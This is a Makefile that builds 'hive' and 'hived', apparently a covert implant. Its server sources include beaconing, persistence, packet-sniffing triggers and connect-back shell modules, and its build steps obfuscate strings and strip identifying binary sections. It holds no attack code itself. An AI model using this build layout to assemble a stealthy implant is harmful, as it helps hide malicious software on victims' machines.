
BIN = .
LIB = .

CLIENT_BASENAME = hive
SERVER_BASENAME = hived

POLARSSL = ../libs/polarssl-0.14.0
INCLUDES = -I$(POLARSSL)/include -I../libs
LIBPOLARSSL = $(POLARSSL)/library/libpolarssl.a

SERVER_SRCS = Beacon.c persistence.c \
    SurveyMAC.c SurveyUptime.c Trigger.c daemonize.c \
    main.c init_strings.o init_crypto_strings.o string_utils.o tiny_crc16.c \
	trigger_b64.c trigger_exec.c trigger_payload.c trigger_sniff.c \
	threads.c connectShell.c Shell.c ../libs/crypto.c $(LIBPOLARSSL)

COMMON_SRCS = 

#OBJECTS = $(SRCS:%.c=%.o)
CFLAGS += -Os -W -Wall -D_IH_X86_BUILD -D_FILE_OFFSET_BITS=64 -m32 -lpthread
CFLAGS += $(INCLUDES)
DBGFLAGS += -DDEBUG -D_DEBUG -g

STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note

OS = $(shell uname)

ifeq ($(OS),SunOS)
CFLAGS += -DSOLARIS
ARCH = $(shell uname -p)
CLIENT = $(CLIENT_BASENAME)-solaris-$(ARCH)
SERVER = $(SERVER_BASENAME)-solaris-$(ARCH)
endif

ifeq ($(OS),Linux)
CFLAGS += -DLINUX
ARCH = $(shell uname -m)
CLIENT = $(CLIENT_BASENAME)-linux-$(ARCH)
SERVER = $(SERVER_BASENAME)-linux-$(ARCH)
endif

ifdef	DEBUG
CFLAGS += -DDEBUG -g
endif

ifdef	STATIC
CFLAGS += -static
endif

all: $(LIBPOLARSSL) $(SERVER) $(SERVER)-dbg

$(LIBPOLARSSL):
	make -C $(POLARSSL)/library

debug: $(LIBPOLARSSL) $(SERVER)-dbg

release: $(LIBPOLARSSL) $(SERVER)

$(CLIENT):
ifeq ($(OS),Linux)
	gcc $(CFLAGS) $(COMMON_SRCS) $(CLIENT_SRCS) -L$(LIB) -o $(BIN)/$(CLIENT)
	strip $(STRIPFLAGS) $(BIN)/$(CLIENT)
	md5sum $(BIN)/$(CLIENT) > $(BIN)/$(CLIENT).md5
else
	@echo
	@echo "**Not building CLIENT because OS is $(OS)**"
endif

$(CLIENT)-dbg:
ifeq ($(OS),Linux)
	gcc $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(CLIENT_SRCS) -L$(LIB) -o $(BIN)/$(CLIENT)-dbg
	md5sum $(BIN)/$(CLIENT)-dbg > $(BIN)/$(CLIENT)-dbg.md5
else
	@echo
	@echo "**Not building CLIENT-DBG because OS is $(OS)**"
endif

$(SERVER): $(LIBPOLARSSL) strings
ifeq ($(OS),SunOS)
	gcc $(CFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -lsocket -lnsl -o $(BIN)/$(SERVER)
	strip $(BIN)/$(SERVER)
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
endif
ifeq ($(OS),Linux)
	gcc $(CFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -o $(BIN)/$(SERVER)
	strip $(STRIPFLAGS) $(BIN)/$(SERVER)
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
endif

$(SERVER)-dbg: $(LIBPOLARSSL) strings
ifeq ($(OS),SunOS)
	gcc $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -lsocket -lnsl -o $(BIN)/$(SERVER)-dbg
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
endif
ifeq ($(OS),Linux)
	gcc $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -o $(BIN)/$(SERVER)-dbg
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
endif

strings: init_strings.o string_utils.o init_crypto_strings.o

init_crypto_strings.o: init_crypto_strings.c string_utils.o 
	gcc -c init_crypto_strings.c 

init_crypto_strings.c: crypto_strings.txt string_utils.o
	python mod_gen_cryptostring_header.py crypto_strings.txt CRYPTO_STRINGS

init_strings.o: init_strings.c string_utils.o
	gcc -c init_strings.c

init_strings.c: server_strings.txt string_utils.h
	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS

string_utils.o: string_utils.h string_utils.c
	gcc -c string_utils.c string_utils.h

clean:
	rm -f *.o 
	rm -f $(BIN)/$(CLIENT)-dbg*
	rm -f $(BIN)/$(CLIENT)*
	rm -f $(BIN)/$(SERVER)-dbg*
	rm -f $(BIN)/$(SERVER)*
	rm -f *PATCHED
	rm -f init_strings.*
	rm -f proj_strings*
	rm -f init_crypto_strings.*
	rm -f crypto_proj_strings.h
	rm -f crypto_strings_main.h
	rm -f string_utils.h.gch
	rm -f hive.tar
	make -C $(POLARSSL)/library clean

svnclean: clean

md5:
	md5sum $(BIN)/$(CLIENT)-dbg > $(BIN)/$(CLIENT)-dbg.md5
	md5sum $(BIN)/$(CLIENT) > $(BIN)/$(CLIENT).md5
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
	
tgz: tarball

tarball:
	cd ..; tar --exclude .svn --exclude HiveServer.sdf --exclude *.gz --exclude *.tar --exclude *.tgz -cvf $(CLIENT_BASENAME).tar ./server ./libs
